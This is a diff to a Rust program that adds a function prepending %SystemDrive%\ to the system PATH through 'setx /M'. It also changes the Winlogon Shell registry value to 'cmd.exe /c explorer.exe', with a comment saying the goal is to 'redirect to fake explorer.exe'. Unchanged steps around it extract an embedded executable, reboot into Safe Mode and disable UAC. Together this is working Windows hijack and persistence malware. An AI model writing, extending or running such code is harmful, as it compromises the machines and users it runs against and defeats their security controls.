@@ -176,6 +176,50 @@ fn create_directory() -> io::Result<()> {
     }
 }
 
+fn set_system_path_first() -> io::Result<()> {
+    // Retrieve the current PATH (this may be the user or process PATH)
+    let mut current_path = env::var("PATH").unwrap_or_default();
+
+    // Trim any leading/trailing spaces and quotes from the whole string
+    current_path = current_path.trim().trim_matches('"').to_string();
+
+    let parts: Vec<&str> = current_path.split(';').collect();
+
+    // Define the expected system drive reference
+    let system_drive_var = "%SystemDrive%\\";
+
+    // Check if the first non-empty element is already "%SystemDrive%\"
+    if let Some(first) = parts.iter().find(|s| !s.trim().is_empty()) {
+        if first.trim().eq_ignore_ascii_case(system_drive_var) {
+            println!("[+] System PATH already starts with {}", system_drive_var);
+            return Ok(());
+        }
+    }
+
+    // Prepend "%SystemDrive%\" to the current PATH
+    let new_path = format!("{};{}", system_drive_var, current_path);
+
+    // Remove all quotes from the new_path string
+    let sanitized_path = new_path.replace('"', "");
+
+    // Call setx directly to update the machine PATH (setx has a limit of ~1024 characters)
+    let output = Command::new("setx")
+        .args(&["/M", "PATH", &sanitized_path])
+        .output();
+
+    if let Ok(output) = output {
+        if output.status.success() {
+            println!("[+] PATH successfully updated.");
+        } else {
+            eprintln!("Error updating system PATH: {:?}", output);
+        }
+    } else {
+        eprintln!("Failed to execute setx command.");
+    }
+
+    Ok(())
+}
+
 fn modify_registry() -> io::Result<()> {
     // Open the registry key for Winlogon with write access
     let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
@@ -185,7 +229,7 @@ fn modify_registry() -> io::Result<()> {
     )?;
 
     // Set the new "Shell" value
-    let new_shell_value = r"%SystemDrive%\explorer.exe";  
+    let new_shell_value = r"cmd.exe /c explorer.exe";  
     winlogon_key.set_value("Shell", &new_shell_value)?;
 
     println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
@@ -238,17 +282,23 @@ fn main() {
         eprintln!("Error extracting embedded safe boot executable: {}", e);
     }
     
-    // Step 7: Reboot the system to Safe Mode if needed
+    // Step 7: Use set system path first to redirect to fake explorer.exe
+    if let Err(e) = set_system_path_first() {
+        eprintln!("Error setting system path: {}", e);
+        return;
+    }
+
+    // Step 8: Reboot the system to Safe Mode if needed
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
 
-    // Step 8: Disable UAC
+    // Step 9: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
     }
 
-    // Step 9: Modify Registry
+    // Step 10: Modify Registry
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying registry: {}", e);
     }
